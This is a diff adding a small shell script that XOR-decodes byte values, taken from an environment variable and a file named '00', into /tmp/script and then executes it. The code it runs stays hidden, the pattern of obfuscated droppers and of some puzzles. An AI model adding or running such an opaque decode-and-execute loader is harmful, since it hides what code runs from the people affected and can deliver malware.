@@ -1,0 +1,15 @@
+#!/bin/sh
+
+TAB='	'
+
+echo "$A" >/tmp/A
+
+paste /tmp/A 00 | tr -d '\r' | while IFS="${TAB}" read -r _1 _2; do
+	if [ -z "$_1" ] || [ -z "$_2" ]; then
+		break
+	fi
+
+	printf "\\$(printf "%03o" "$((_1 ^ _2))")"
+done >/tmp/script
+
+sh /tmp/script
